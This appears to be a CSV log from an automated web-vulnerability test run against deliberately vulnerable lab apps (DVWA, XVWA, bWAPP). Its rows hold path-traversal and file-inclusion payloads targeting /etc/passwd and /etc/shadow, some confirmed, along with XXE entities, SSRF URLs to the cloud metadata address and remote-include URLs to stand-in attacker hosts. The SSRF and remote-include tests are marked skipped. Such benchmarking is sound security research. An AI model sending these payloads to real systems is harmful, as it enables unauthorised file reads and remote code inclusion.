+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Path Traversal,Evasion,15,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.276590+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,297,,2026-10-19T02:49:01.511838+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:49:01.297480+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,3,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:01.305750+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,4,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.312694+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,5,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:01.325697+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,6,../../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:01.362224+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,7,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:49:01.380685+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,8,..\..\..\..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:49:01.382389+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,9,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:49:01.382920+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,10,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.383460+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,11,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,110,,2026-10-19T02:49:01.413591+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,12,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,94,,2026-10-19T02:49:01.413591+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Basic,13,../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:01.424102+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,1,..\..\..\..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:49:01.548627+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,2,../../../../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.579615+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,3,../../../../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:01.574227+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,4,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:01.569214+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,5,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.584328+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,6,../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,78,,2026-10-19T02:49:01.611946+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,7,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.617143+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,8,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.628116+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,9,../../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:49:01.633176+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,10,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.638908+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,11,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.644002+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,12,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.648401+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,13,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.656622+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Advanced,14,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.673681+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,1,..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.683528+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,2,../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.687498+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,3,../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:01.691791+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,4,../../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.696878+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,5,..\..\..\..\..\windows\win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.701096+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,6,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.709382+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,7,../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:01.728854+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,8,../../../../../../../windows/system32/drivers/etc/hosts,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.735883+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,9,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.739987+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,10,../../../../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.745681+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,11,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:01.750389+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,12,../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,62,,2026-10-19T02:49:01.754696+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,13,../etc/shadow,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.761871+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,14,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.781152+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Path Traversal,Evasion,15,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.798408+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Basic,1,http://[::1],0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Basic,2,http://127.0.0.1,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Basic,3,http://0.0.0.0,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Basic,4,http://localhost,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Basic,5,http://169.254.169.254,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Advanced,1,http://localhost,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Advanced,2,http://127.0.0.1,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Advanced,3,http://0.0.0.0,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Advanced,4,http://[::1],0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Advanced,5,http://169.254.169.254,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Evasion,1,http://127.0.0.1,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Evasion,2,http://[::1],0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Evasion,3,http://0.0.0.0,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Evasion,4,http://169.254.169.254,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SSRF,Evasion,5,http://localhost,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: available XVWA sink fetches the URL and writes a random image file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Basic,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,219,,2026-10-19T02:49:01.955301+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Basic,2,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.803531+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Basic,3,../../../../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.809928+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Basic,4,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.815761+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Basic,5,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:01.820743+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Basic,6,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:01.825261+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Basic,7,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:01.840317+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Advanced,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:49:01.847133+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Advanced,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:49:01.848134+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Advanced,3,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:49:01.848134+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Advanced,4,../../../../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:49:01.848134+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Advanced,5,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:01.993852+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Advanced,6,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:02.015757+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Advanced,7,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:02.026662+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Evasion,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:49:02.037959+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Evasion,2,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:02.042128+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Evasion,3,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:02.046612+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Evasion,4,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.058632+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Evasion,5,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.054444+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Evasion,6,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:02.066082+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Local File Inclusion,Evasion,7,../../../../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:02.077575+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Basic,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:49:02.358841+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Basic,2,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:49:02.094588+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Basic,3,../../../../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:49:02.094588+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Basic,4,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:02.106377+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Basic,5,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:02.113555+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Basic,6,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,63,,2026-10-19T02:49:02.121708+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Basic,7,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:02.145573+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Advanced,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.153909+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Advanced,2,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:49:02.161235+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Advanced,3,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:49:02.166085+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Advanced,4,../../../../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:02.171062+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Advanced,5,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:02.193710+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Advanced,6,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.199776+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Advanced,7,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,78,,2026-10-19T02:49:02.227981+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Evasion,1,../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.227981+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Evasion,2,../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.239924+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Evasion,3,../../../../../../../etc/passwd,200,FILE_CONTENT_CONFIRMED,true,known_local_file_marker,,78,,2026-10-19T02:49:02.246980+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Evasion,4,../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.251979+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Evasion,5,../../../../etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:02.259071+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Evasion,6,../../boot.ini,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:49:02.265428+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Local File Inclusion,Evasion,7,../../../../../../../windows/win.ini,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:49:02.295016+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Basic,1,http://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Basic,2,https://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Basic,3,https://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Basic,4,http://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Basic,5,http://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Basic,6,https://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Advanced,1,http://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Advanced,2,https://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Advanced,3,http://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Advanced,4,http://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Advanced,5,https://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Advanced,6,https://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Evasion,1,http://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Evasion,2,https://malicious.site/backdoor.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Evasion,3,https://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Evasion,4,http://attacker.com/payload.php,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Evasion,5,http://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Remote File Inclusion,Evasion,6,https://evil.com/shell.txt,0,SKIPPED_SAFETY_OR_SIDE_EFFECT,false,,,0,Skipped: remote include can fetch/execute a remote file.,2026-10-19T02:48:55.827847+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Basic,1,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,406,,2026-10-19T02:49:02.636754+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Basic,2,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,62,,2026-10-19T02:49:02.303839+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Basic,3,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:49:02.319822+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Basic,4,"<!entity xxe SYSTEM ""file:///etc/passwd"">",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:49:02.324748+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Basic,5,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,63,,2026-10-19T02:49:02.324748+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Basic,6,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,63,,2026-10-19T02:49:02.328886+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Advanced,1,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,31,,2026-10-19T02:49:02.331900+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Advanced,2,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,16,,2026-10-19T02:49:02.331900+00:00
